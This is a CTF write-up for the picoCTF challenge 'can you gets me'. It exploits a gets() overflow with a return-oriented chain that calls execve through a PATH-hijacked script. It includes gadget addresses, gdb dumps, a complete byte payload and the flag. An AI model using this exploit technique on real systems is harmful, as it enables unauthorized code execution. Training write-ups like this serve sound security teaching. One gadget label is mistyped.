# CorCan you gets me ?

>Can you exploit the following program to get a flag?
>You may need to think return-oriented if you want to program your way to the flag.
>You can find the program in /problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d on the shell server. Source. 

### [~$ cd ..](../)

We are given the source of a vulnerable program, as well as the binary:

> ```c
>#include <stdio.h>
>#include <stdlib.h>
>#include <string.h>
>#include <unistd.h>
>#include <sys/types.h>
>
>#define BUFSIZE 16
>
>void vuln() {
>	char buf[16];
>	printf("GIVE ME YOUR NAME!\n");
>	return gets(buf);
>}
>
>int main(int argc, char **argv){
>
>	setvbuf(stdout, NULL, _IONBF, 0);
>
>
>	// Set the gid to the effective gid
>	// this prevents /bin/sh from dropping the privileges
>	gid_t gid = getegid();
>	setresgid(gid, gid, gid);
>	vuln();
>
>}
> ```

**TL; DR: It's a classical ROP attack**

## The payload

Knowing that the ASLR is enabled, that the stack is not executable and according to the simplicity of this program, we guessed, and it was confirmed
by a hint, that we had to exploit it using a Return-Oriented-Programming.

What is this ?

ROP-attack is a well-known and powerful way to exploit binaries, which is able to bypass ASLR and doesn't require any shellcode. The idea is quite simple: by chaining
some small groups of instructions, whe can build a valid longest series of instructions which can finally behave like a shellcode. These small groups are called "gadgets", and
they have to end with the instruction `ret`. Therefore, we can easily chain them on the top of the stack.

To find these gadgets, we used to 0vercl0k's tool: [rp](https://github.com/0vercl0k/rp/downloads)

Well, but which gadgets do we need ?
The man idea is to execute something like `execve("/bin/sh", NULL, NULL)`. To succeed, with then need to have the following values:
* `$eax=0xb`, 0xb begin the syscall code we expect
* `$ebx` contains the address of "/bin/sh"
* `$ecx=NULL` the arguments to pass to the command (don't care)
* `$edx=NULL` the address of the envionment variables (don't care)

To obtain the expected setting, we will push the values onto the stack and then pop them into registers. The outline of the payload is therefore:

* fill the buffer
* @gadget(pop eax; ret)
* 11
* @gadget(pop ebx; ret)
* @"/bin/sh"
* @gadget(pop ecx; ret)
* 0
* @gadget(pop edx; ret)
* 0
* interrupt

Indeed, these values will be placed on the top of the stack as `vuln` ends, that's the reason why we need to pop them.

### Address of "/bin/sh"

"/bin/sh" doesn't appear in the program, and we have to find a way to execute the expected command. To get around the problem, we decided to create our own command
and to use a constant string in `rodata`:

> ```sh
>% readelf -x .rodata ./gets|head -n 20
>
>Vidange hexadécimale de la section « .rodata » :
>0x080bb320 03000000 01000200 47495645 204d4520 ........GIVE ME 
>0x080bb330 594f5552 204e414d 4521002e 2e2f6373 YOUR NAME!.../cs
>0x080bb340 752f6c69 62632d73 74617274 2e630046 u/libc-start.c.F
>0x080bb350 4154414c 3a206b65 726e656c 20746f6f ATAL: kernel too
>0x080bb360 206f6c64 0a000000 5f5f6568 64725f73  old....__ehdr_s
>0x080bb370 74617274 2e655f70 68656e74 73697a65 tart.e_phentsize
>0x080bb380 203d3d20 73697a65 6f66202a 474c2864  == sizeof *GL(d
>0x080bb390 6c5f7068 64722900 46415441 4c3a2063 l_phdr).FATAL: c
>0x080bb3a0 616e6e6f 74206465 7465726d 696e6520 annot determine 
>0x080bb3b0 6b65726e 656c2076 65727369 6f6e0a00 kernel version..
>0x080bb3c0 756e6578 70656374 65642072 656c6f63 unexpected reloc
>0x080bb3d0 20747970 6520696e 20737461 74696320  type in static 
>0x080bb3e0 62696e61 72790000 67656e65 7269635f binary..generic_
>0x080bb3f0 73746172 745f6d61 696e002f 6465762f start_main./dev/
>0x080bb400 66756c6c 002f6465 762f6e75 6c6c0000 full./dev/null..
>0x080bb410 7365745f 74687265 61645f61 72656120 set_thread_area 
>0x080bb420 6661696c 65642077 68656e20 73657474 failed when sett
>0x080bb430 696e6720 75702074 68726561 642d6c6f ing up thread-lo
> ```

It's important here to choose a string ending with a null byte. We choosed here the string "ull" located at `0x080bb40b`. We then had to create
a script named "ull" executing the expected command (i.e `cat` the flag)

## Find gadgets

We then used to program `rp-lin-x86` to find the expected gadgets:

> ```sh
>% ./rop86 --file gets -r 1 --unique|grep "pop eax"
>0x080d244e: pop eax ; call dword [edi+0x4656EE7E] ;  (1 found)
>0x0809ca62: pop eax ; jmp dword [eax] ;  (4 found)
>0x080b81c6: pop eax ; ret  ;  (1 found)
>```

Gadget `pop $eax`: **0x080b81c6**

> ```sh
>% ./rop86 --file gets -r 1 --unique|grep "pop ebx" 
>0x080505a3: pop ebx ; jmp eax ;  (6 found)
>0x0804cec7: pop ebx ; rep ret  ;  (1 found)
>0x080481c9: pop ebx ; ret  ;  (181 found)
>0x080d353c: pop ebx ; retn 0x06F9 ;  (1 found)
> ```

Gadget `pop $ebx`: **0x080481c9**

> ```sh
>% ./rop86 --file gets -r 1 --unique|grep "pop ecx" 
>0x080de955: pop ecx ; ret  ;  (1 found)
> ```

Gadget `pop $ecx`: **0x080de955**

> ```sh
>% ./rop86 --file gets -r 1 --unique|grep "pop edx" 
>0x0806f02a: pop edx ; ret  ;  (2 found)
> ```

Gadget `pop $edx`: **0x0806f02a**

> ```sh
>% ./rop86 --file gets -r 1 --unique|grep "int 0x80"
>0x0806cc23: add byte [eax], al ; int 0x80 ;  (3 found)
>0x0806cc25: int 0x80 ;  (8 found)
>0x0806f630: int 0x80 ; ret  ;  (1 found)
>0x0806cc20: mov eax, 0x00000001 ; int 0x80 ;  (1 found)
>0x0807a9d9: mov eax, 0x00000077 ; int 0x80 ;  (1 found)
>0x0807a9d0: mov eax, 0x000000AD ; int 0x80 ;  (1 found)
>0x0806f62f: nop  ; int 0x80 ;  (1 found)
>0x0806cc1f: or byte [eax+0x00000001], bh ; int 0x80 ;  (1 found)
>0x080b6ed7: push es ; int 0x80 ;  (1 found)
> ```

Gadget `pop $edx`: **0x0806f630**

And finally, the payload becomes:

* 0x080b81c6 ;pop eax
* 0x0000000b ;execve syscall
* 0x080481c9 ;pop ebx
* 0x080bb40b ;"ull"
* 0x080de955 ;pop ecx
* 0x00000000 ;NULL
* 0x0806f02a ;pop edx
* 0x00000000 ;NULL
* 0x0806f630 ;interrupt

## Fill the buffer

By sending some 'A's and breaking after the call the `gets`, we can see that 28 bytes are needed to fill the buffer:

> ```
>gdb-peda$ info reg ebp
>ebp            0xffffd198	0xffffd198
>gdb-peda$ x/30wx $esp
>0xffffd170:	0xffffd180	0x080eaf84	0x00000000	0x080481a8
>0xffffd180:	0x41414141	0x41414141	0x41414141	0x41414141
>0xffffd190:	0x41414141	0x00000300	0xffffd1b8	0x080488e9
>0xffffd1a0:	0x080ea00c	0x00000045	0x00001000	0x000003e8
>0xffffd1b0:	0x080ea070	0xffffd1d0	0x00001000	0x08048b21
>0xffffd1c0:	0x080ea00c	0x00000045	0x00001000	0x08048b21
>0xffffd1d0:	0x00000001	0xffffd294	0xffffd29c	0xffffd1f4
>0xffffd1e0:	0x00000000	0x00000001
> ```

Let's feed the stdin with the payload and break at the end of `vuln`:

> ```
>gdb-peda$ x/12wx $esp
>0xffffd19c:	0x080b81c6	0x0000000b	0x080481c9	0x080bb40b
>0xffffd1ac:	0x080de955	0x00000000	0x0806f02a	0x00000000
>0xffffd1bc:	0x0806f630	0x080ea000	0x00000045	0x00001000
> ```

Perfect!

## Exploit

Since the command "ull" is not a regular command we need to create it:

> ```
>% cd /tmp
>% nano ull
>	#!/bin/sh
	cat /problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d/flag.txt
>% chmod +x ull
>% export PATH=/tmp:$PATH
>% python -c "print 'A' * 28 + '\xc6\x81\x0b\x08\x0b\x00\x00\x00\xc9\x81\x04\x08\x0b\xb4\x0b\x08\x55\xe9\x0d\x08\x00\x00\x00\x00\x2a\xf0\x06\x08\x00\x00\x00\x00\x30\xf6\x06\x08'" | /problems/can-you-gets-me_1_e66172cf5b6d25fffee62caf02c24c3d/gets>
> ```

FLAG: **picoCTF{rOp_yOuR_wAY_tO_AnTHinG_700e9c8e}**
